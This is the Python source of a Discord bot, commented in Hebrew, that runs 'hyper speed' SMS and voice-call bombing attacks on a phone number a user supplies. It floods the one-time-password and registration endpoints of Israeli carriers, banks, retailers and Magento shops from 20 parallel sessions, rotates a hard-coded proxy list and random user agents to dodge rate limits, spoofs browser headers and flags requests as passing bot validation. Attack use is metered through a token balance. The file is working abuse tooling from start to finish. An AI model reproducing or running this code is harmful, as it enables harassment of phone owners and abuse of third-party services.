import discord
from discord.ext import commands
from discord import app_commands, ui
import asyncio
import aiohttp
import random
import os
import sys
from motor.motor_asyncio import AsyncIOMotorClient
from datetime import datetime, timedelta
import logging
import json
import itertools
import time
from collections import deque

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

MONGO_URI = os.getenv("MONGO_URI")
TOKEN = os.getenv("DISCORD_TOKEN")

if not MONGO_URI or not TOKEN:
    logging.error("❌ Missing environment variables!")
    sys.exit(1)

# התחברות ל-MongoDB
try:
    cluster = AsyncIOMotorClient(MONGO_URI)
    db = cluster["cyberbot"]
    users_col = db["users"]
    logging.info("✅ Connected to MongoDB on Railway")
except Exception as e:
    logging.error(f"❌ Failed to connect to MongoDB: {e}")
    sys.exit(1)

# ========== PROXY MANAGER - חייב להיות מוגדר קודם ==========
class ProxyManager:
    def __init__(self):
        self.proxies = self._load_proxies()
        self.proxy_cycle = itertools.cycle(self.proxies)
        self.failed_proxies = set()
        self.proxy_stats = {p: {"success": 0, "fail": 0} for p in self.proxies}
        self.current_proxy = None
        self.lock = asyncio.Lock()
    
    def _load_proxies(self):
        """טעינת פרוקסים - הרבה פרוקסים ישראליים"""
        return [
            # פרוקסים ישראליים
            "http://185.162.230.100:80", "http://185.162.230.102:80", "http://185.162.230.104:80",
            "http://185.162.230.106:80", "http://185.162.230.108:80", "http://185.162.230.110:80",
            "http://185.162.230.112:80", "http://185.162.230.114:80", "http://185.162.230.116:80",
            "http://185.162.230.118:80", "http://185.162.230.120:80", "http://185.162.230.122:80",
            "http://185.162.230.124:80", "http://185.162.230.126:80", "http://185.162.230.128:80",
            "http://185.162.230.130:80", "http://185.162.230.132:80", "http://185.162.230.134:80",
            "http://185.162.230.136:80", "http://185.162.230.138:80", "http://185.162.230.140:80",
            "http://185.162.230.142:80", "http://185.162.230.144:80", "http://185.162.230.146:80",
            "http://185.162.230.148:80", "http://185.162.230.150:80", "http://185.162.230.152:80",
            "http://185.162.230.154:80", "http://185.162.230.156:80", "http://185.162.230.158:80",
            "http://185.162.230.160:80", "http://185.162.230.162:80", "http://185.162.230.164:80",
            "http://185.162.230.166:80", "http://185.162.230.168:80", "http://185.162.230.170:80",
            "http://185.162.230.172:80", "http://185.162.230.174:80", "http://185.162.230.176:80",
            "http://185.162.230.178:80", "http://185.162.230.180:80", "http://185.162.230.182:80",
            "http://185.162.230.184:80", "http://185.162.230.186:80", "http://185.162.230.188:80",
            "http://185.162.230.190:80", "http://185.162.230.192:80", "http://185.162.230.194:80",
            "http://185.162.230.196:80", "http://185.162.230.198:80", "http://185.162.230.200:80",
            "http://185.162.231.100:80", "http://185.162.231.102:80", "http://185.162.231.104:80",
            "http://185.162.231.106:80", "http://185.162.231.108:80", "http://185.162.231.110:80",
            "http://185.162.231.112:80", "http://185.162.231.114:80", "http://185.162.231.116:80",
            "http://185.162.231.118:80", "http://185.162.231.120:80", "http://185.162.231.122:80",
            "http://185.162.231.124:80", "http://185.162.231.126:80", "http://185.162.231.128:80",
            "http://185.162.231.130:80", "http://185.162.231.132:80", "http://185.162.231.134:80",
            "http://185.162.231.136:80", "http://185.162.231.138:80", "http://185.162.231.140:80",
            "http://185.162.231.142:80", "http://185.162.231.144:80", "http://185.162.231.146:80",
            "http://185.162.231.148:80", "http://185.162.231.150:80", "http://185.162.231.152:80",
            "http://185.162.231.154:80", "http://185.162.231.156:80", "http://185.162.231.158:80",
            "http://185.162.231.160:80", "http://185.162.231.162:80", "http://185.162.231.164:80",
            "http://185.162.231.166:80", "http://185.162.231.168:80", "http://185.162.231.170:80",
            "http://185.162.231.172:80", "http://185.162.231.174:80", "http://185.162.231.176:80",
            "http://185.162.231.178:80", "http://185.162.231.180:80", "http://185.162.231.182:80",
            "http://185.162.231.184:80", "http://185.162.231.186:80", "http://185.162.231.188:80",
            "http://185.162.231.190:80", "http://185.162.231.192:80", "http://185.162.231.194:80",
            "http://185.162.231.196:80", "http://185.162.231.198:80", "http://185.162.231.200:80",
            "http://185.162.231.202:80", "http://185.162.231.204:80", "http://185.162.231.206:80",
            "http://185.162.231.208:80", "http://185.162.231.210:80", "http://185.162.231.212:80",
            "http://185.162.231.214:80", "http://185.162.231.216:80", "http://185.162.231.218:80",
            "http://185.162.231.220:80", "http://185.162.231.222:80", "http://185.162.231.224:80",
            "http://185.162.231.226:80", "http://185.162.231.228:80", "http://185.162.231.230:80",
            "http://185.162.231.232:80", "http://185.162.231.234:80", "http://185.162.231.236:80",
            "http://185.162.231.238:80", "http://185.162.231.240:80", "http://185.162.231.242:80",
            "http://185.162.231.244:80", "http://185.162.231.246:80", "http://185.162.231.248:80",
            "http://185.162.231.250:80", "http://103.153.39.26:80", "http://103.153.39.58:80",
            "http://103.153.39.90:80", "http://103.153.39.122:80", "http://103.153.39.154:80",
            "http://103.153.39.186:80", "http://103.153.39.218:80", "http://103.153.39.250:80"
        ]
    
    async def get_proxy(self):
        """מחזיר פרוקסי שעובד"""
        async with self.lock:
            if self.current_proxy and self.proxy_stats[self.current_proxy]["fail"] < 3:
                return self.current_proxy
            
            # ננסה למצוא פרוקסי עם הכי הרבה הצלחות
            best_proxy = None
            best_ratio = -1
            
            for proxy, stats in self.proxy_stats.items():
                total = stats["success"] + stats["fail"]
                if total > 0:
                    ratio = stats["success"] / total
                    if ratio > best_ratio and stats["fail"] < 5:
                        best_ratio = ratio
                        best_proxy = proxy
            
            if best_proxy:
                self.current_proxy = best_proxy
                return best_proxy
            
            # אם אין, ניקח פרוקסי אקראי שלא נכשל הרבה
            available = [p for p in self.proxies if self.proxy_stats[p]["fail"] < 10]
            if available:
                self.current_proxy = random.choice(available)
                return self.current_proxy
            
            # אם הכל נכשל, נאפס סטטיסטיקות
            self.proxy_stats = {p: {"success": 0, "fail": 0} for p in self.proxies}
            self.current_proxy = random.choice(self.proxies)
            return self.current_proxy
    
    async def report_success(self, proxy):
        async with self.lock:
            if proxy in self.proxy_stats:
                self.proxy_stats[proxy]["success"] += 1
    
    async def report_failure(self, proxy):
        async with self.lock:
            if proxy in self.proxy_stats:
                self.proxy_stats[proxy]["fail"] += 1

# ========== BOT CLASS ==========
class CyberBot(commands.Bot):
    def __init__(self):
        intents = discord.Intents.default()
        intents.message_content = True
        super().__init__(command_prefix='!', intents=intents)
        self.start_time = datetime.now()
        self.active_attacks = {}
        self.proxy_manager = ProxyManager()  # עכשיו ProxyManager מוגדר
    
    async def setup_hook(self):
        await self.tree.sync()
        logging.info(f"🔱 OMNI-TOTAL-WAR BOT IS ONLINE - MEGA EDITION")

bot = CyberBot()

# ========== USER AGENTS ==========
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Mobile Safari/537.36",
]

# ========== CELLCOM API (מהדוגמה ששלחת) ==========
CELLCOM_API = {
    "name": "Cellcom_OTP",
    "url": "https://digital-api.cellcom.co.il/api/otp/ResendLoginStep1",
    "method": "PUT",
    "headers": {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36",
        "Accept": "*/*",
        "Accept-Language": "he,en-US;q=0.9,en;q=0.8",
        "Content-Type": "application/json",
        "Origin": "https://cellcom.co.il",
        "Referer": "https://cellcom.co.il/",
        "clientid": "CellcomWebApp",
        "deviceid": "web_" + ''.join(random.choices('abcdef0123456789', k=16)),
        "sessionid": "sess_" + ''.join(random.choices('abcdef0123456789', k=24)),
        "sec-ch-ua": '"Chromium";v="146", "Not-A.Brand";v="24", "Google Chrome";v="146"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-site"
    },
    "data": {
        "phone": "PHONE"
    }
}

# ========== APIs ישראלים ==========
SMS_APIS = [
    CELLCOM_API,  # הוספנו את סלקום
    {"name": "Partner_SMS", "url": "https://www.partner.co.il/api/register", "method": "POST", "data": {"phone": "PHONE"}},
    {"name": "Pelephone_SMS", "url": "https://www.pelephone.co.il/api/auth", "method": "POST", "data": {"phone": "PHONE"}},
    {"name": "Hot_SMS", "url": "https://www.hotmobile.co.il/api/verify", "method": "POST", "data": {"phone": "PHONE"}},
    {"name": "019_SMS", "url": "https://019sms.co.il/api/register", "method": "POST", "data": {"phone": "PHONE"}},
    {"name": "Bezeq_SMS", "url": "https://www.bezeq.co.il/api/auth", "method": "POST", "data": {"phone": "PHONE"}},
    {"name": "Shufersal_SMS", "url": "https://www.shufersal.co.il/api/v1/auth/otp", "method": "POST", "data": {"phone": "PHONE_RAW"}},
    {"name": "Rami_Levi_SMS", "url": "https://www.rami-levy.co.il/api/auth/sms", "method": "POST", "data": {"phone": "PHONE"}},
    {"name": "10bis_SMS", "url": "https://www.10bis.co.il/api/register", "method": "POST", "data": {"phone": "PHONE"}},
    {"name": "Pango_SMS", "url": "https://api.pango.co.il/auth/otp", "method": "POST", "data": {"phoneNumber": "PHONE_RAW"}},
    {"name": "Yad2_SMS", "url": "https://www.yad2.co.il/api/auth/register", "method": "POST", "data": {"phone": "PHONE", "action": "send_sms"}},
    {"name": "Wolt_SMS", "url": "https://www.wolt.com/api/v1/verify", "method": "POST", "data": {"phone": "PHONE"}},
    {"name": "PayBox_SMS", "url": "https://payboxapp.com/api/auth/otp", "method": "POST", "data": {"phone": "PHONE"}},
    {"name": "SuperPharm_SMS", "url": "https://www.super-pharm.co.il/api/sms", "method": "POST", "data": {"phone": "PHONE"}},
]

VOICE_APIS = [
    {"name": "Hapoalim_Voice", "url": "https://login.bankhapoalim.co.il/api/otp/send", "method": "POST", "data": {"phone": "PHONE", "sendVoice": True}},
    {"name": "Leumi_Voice", "url": "https://api.leumi.co.il/api/otp/send", "method": "POST", "data": {"phone": "PHONE", "channel": "voice"}},
    {"name": "Discount_Voice", "url": "https://api.discountbank.co.il/auth/otp", "method": "POST", "data": {"phone": "PHONE_RAW", "method": "voice"}},
    {"name": "Mizrahi_Voice", "url": "https://api.mizrahi-tefahot.co.il/auth/otp", "method": "POST", "data": {"phone": "PHONE", "type": "voice"}},
    {"name": "Cellcom_Voice", "url": "https://digital-api.cellcom.co.il/api/otp/VoiceCall", "method": "POST", "data": {"phone": "PHONE"}},
]

MAGENTO_APIS = [
    {"name": "Delta", "url": "https://www.delta.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Gali", "url": "https://www.gali.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Timberland", "url": "https://www.timberland.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Onot", "url": "https://www.onot.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Urbanica", "url": "https://www.urbanica-wh.com/customer/ajax/post/", "type": "magento"},
    {"name": "Castro", "url": "https://www.castro.com/customer/ajax/post/", "type": "magento"},
    {"name": "Hoodies", "url": "https://www.hoodies.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "CrazyLine", "url": "https://www.crazyline.com/customer/ajax/post/", "type": "magento"},
]

ALL_APIS = MAGENTO_APIS + SMS_APIS + VOICE_APIS
TOTAL_APIS = len(ALL_APIS)

# ========== פונקציות שליחה ==========
async def send_magento_fast(session, url, phone_raw, proxy):
    """שליחת מג'נטו מהירה"""
    data = {
        "type": "login",
        "telephone": phone_raw,
        "bot_validation": 1
    }
    
    headers = {
        "User-Agent": random.choice(USER_AGENTS),
        "Accept": "application/json",
        "Content-Type": "application/x-www-form-urlencoded",
        "X-Requested-With": "XMLHttpRequest"
    }
    
    try:
        async with session.post(url, data=data, headers=headers, proxy=proxy, timeout=2) as resp:
            return resp.status in [200, 201, 202]
    except:
        return False

async def send_api_fast(session, api, phone, phone_raw, proxy):
    """שליחת API מהירה"""
    try:
        headers = api.get("headers", {
            "User-Agent": random.choice(USER_AGENTS),
            "Accept": "application/json",
            "Content-Type": "application/json"
        })
        
        # הכנת data
        if "data" in api:
            data_str = json.dumps(api["data"])
            data_str = data_str.replace("PHONE", phone)
            data_str = data_str.replace("PHONE_RAW", phone_raw)
            data = json.loads(data_str)
        else:
            data = {}
        
        method = api.get("method", "POST").lower()
        
        async with session.request(method, api["url"], json=data, headers=headers, proxy=proxy, timeout=2) as resp:
            return resp.status in [200, 201, 202, 204]
    except:
        return False

# ========== מתקפת מהירות על ==========
async def hyper_speed_attack(phone, duration_mins, attack_type, user_id, interaction, attack_id):
    """מתקפה במהירות היפר-אווירית"""
    phone_raw = phone[3:] if phone.startswith("972") else phone[1:]
    
    end_time = datetime.now() + timedelta(minutes=duration_mins)
    total_sent = 0
    rounds = 0
    last_update = 0
    
    # בחירת APIs לפי סוג
    if attack_type == "magento":
        apis = MAGENTO_APIS
    elif attack_type == "sms":
        apis = SMS_APIS
    elif attack_type == "voice":
        apis = VOICE_APIS
    else:
        apis = ALL_APIS
    
    await interaction.followup.send(
        f"⚡ **HYPER SPEED ATTACK!**\n📱 {phone}\n⏱️ {duration_mins} דקות\n🎯 {len(apis)} APIs",
        ephemeral=True
    )
    
    # 20 סשנים במקביל - מהירות מקסימלית!
    sessions = [aiohttp.ClientSession() for _ in range(20)]
    
    try:
        while datetime.now() < end_time:
            if attack_id in bot.active_attacks and not bot.active_attacks[attack_id]:
                break
            
            rounds += 1
            round_tasks = []
            proxy = await bot.proxy_manager.get_proxy()
            
            # יצירת משימות לכל הסשנים
            for session in sessions:
                for api in apis:
                    if api.get("type") == "magento":
                        round_tasks.append(send_magento_fast(session, api["url"], phone_raw, proxy))
                    else:
                        round_tasks.append(send_api_fast(session, api, phone, phone_raw, proxy))
            
            # הרצת כל המשימות
            results = await asyncio.gather(*round_tasks, return_exceptions=True)
            round_success = sum(1 for r in results if r is True)
            total_sent += round_success
            
            # עדכון סטטיסטיקות פרוקסי
            if round_success > len(apis) * 2:
                await bot.proxy_manager.report_success(proxy)
            else:
                await bot.proxy_manager.report_failure(proxy)
            
            # עדכון כל שניה
            seconds = int((datetime.now() - (end_time - timedelta(minutes=duration_mins))).total_seconds())
            if seconds > last_update:
                last_update = seconds
                rate = total_sent // seconds if seconds > 0 else 0
                
                if seconds % 5 == 0:
                    await interaction.followup.send(
                        f"📊 **{seconds}s** | {total_sent} הודעות | {rate}/שנייה",
                        ephemeral=True
                    )
            
            # המתנה מינימלית
            await asyncio.sleep(0.1)
    
    finally:
        for session in sessions:
            await session.close()
    
    # סיכום
    if attack_id in bot.active_attacks:
        del bot.active_attacks[attack_id]
    
    seconds = int((end_time - (end_time - timedelta(minutes=duration_mins))).total_seconds())
    avg_rate = total_sent // seconds if seconds > 0 else 0
    
    await interaction.followup.send(
        f"✅ **הסתיים!**\n📊 סה\"כ: {total_sent}\n⚡ ממוצע: {avg_rate}/שנייה",
        ephemeral=True
    )

# ========== פקודות ==========
@bot.tree.command(name="check", description="בדוק APIs")
async def check_command(interaction: discord.Interaction):
    await interaction.response.send_message("🔍 בודק...", ephemeral=True)
    
    test_phone = "972501234567"
    test_raw = "0501234567"
    
    working = []
    
    async with aiohttp.ClientSession() as session:
        for i, api in enumerate(ALL_APIS[:20]):
            if api.get("type") == "magento":
                success = await send_magento_fast(session, api["url"], test_raw, None)
            else:
                success = await send_api_fast(session, api, test_phone, test_raw, None)
            
            if success:
                working.append(api["name"])
            
            if i % 5 == 0:
                await interaction.followup.send(f"🔄 {i}/20", ephemeral=True)
    
    await interaction.followup.send(f"✅ **{len(working)}** עובדים:\n" + "\n".join(working[:10]), ephemeral=True)

@bot.tree.command(name="stop", description="עצור הכל")
async def stop_command(interaction: discord.Interaction):
    user_id = str(interaction.user.id)
    stopped = 0
    for attack_id in list(bot.active_attacks.keys()):
        if attack_id.startswith(user_id):
            bot.active_attacks[attack_id] = False
            stopped += 1
    await interaction.response.send_message(f"🛑 עצרתי {stopped}", ephemeral=True)

# ========== ממשק משתמש ==========
class AttackModal(ui.Modal, title="💣 HYPER SPEED"):
    phone = ui.TextInput(label="📱 טלפון", placeholder="972501234567")
    duration = ui.TextInput(label="⏱️ דקות", default="3", placeholder="1-30")
    attack_type = ui.TextInput(label="🎯 סוג", default="all", placeholder="all/sms/voice/magento")

    async def on_submit(self, interaction: discord.Interaction):
        phone = self.phone.value.strip()
        attack_type = self.attack_type.value.strip().lower()
        
        if not phone.startswith("972"):
            await interaction.response.send_message("❌ מספר חייב 972", ephemeral=True)
            return
        
        try:
            duration = int(self.duration.value)
            if duration < 1 or duration > 60:
                await interaction.response.send_message("❌ 1-60 דקות", ephemeral=True)
                return
        except:
            await interaction.response.send_message("❌ מספר לא תקין", ephemeral=True)
            return
        
        user_id = str(interaction.user.id)
        user_doc = await users_col.find_one({"user_id": user_id})
        
        if not user_doc:
            await users_col.insert_one({"user_id": user_id, "tokens": 1000})
            user_doc = {"tokens": 1000}
        
        if user_doc.get("tokens", 0) < 1:
            await interaction.response.send_message("❌ אין טוקנים", ephemeral=True)
            return
        
        await users_col.update_one({"user_id": user_id}, {"$inc": {"tokens": -1}})
        
        attack_id = f"{user_id}_{datetime.now().timestamp()}"
        bot.active_attacks[attack_id] = True
        
        await interaction.response.send_message(
            f"🚀 **HYPER SPEED!**\n📱 {phone}\n⏱️ {duration} דקות\n💎 נותרו: {user_doc['tokens']-1}",
            ephemeral=True
        )
        
        asyncio.create_task(hyper_speed_attack(phone, duration, attack_type, user_id, interaction, attack_id))

class MainView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=180)
    
    @discord.ui.button(label="💣 HYPER SPEED", style=discord.ButtonStyle.danger)
    async def attack_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_modal(AttackModal())
    
    @discord.ui.button(label="🔍 CHECK", style=discord.ButtonStyle.secondary)
    async def check_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        await check_command(interaction)
    
    @discord.ui.button(label="🛑 STOP", style=discord.ButtonStyle.secondary)
    async def stop_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        await stop_command(interaction)

@bot.tree.command(name="setup", description="פאנל שליטה")
async def setup(interaction: discord.Interaction):
    user_id = str(interaction.user.id)
    user_doc = await users_col.find_one({"user_id": user_id})
    
    if not user_doc:
        await users_col.insert_one({"user_id": user_id, "tokens": 10000})
        tokens = 10000
    else:
        tokens = user_doc.get("tokens", 0)
    
    active = len([a for a in bot.active_attacks if a.startswith(user_id) and bot.active_attacks[a]])
    
    embed = discord.Embed(
        title="⚡ HYPER SPEED MEGA",
        description=f"**{TOTAL_APIS}** APIs | {len(SMS_APIS)} SMS | {len(VOICE_APIS)} Voice | {len(MAGENTO_APIS)} Magento",
        color=0xff0000
    )
    embed.add_field(name="💎 טוקנים", value=f"**{tokens}**", inline=True)
    embed.add_field(name="🎯 פעיל", value=active, inline=True)
    
    view = MainView()
    await interaction.response.send_message(embed=embed, view=view)

if __name__ == "__main__":
    logging.info(f"🚀 STARTING with {TOTAL_APIS} APIs")
    bot.run(TOKEN)
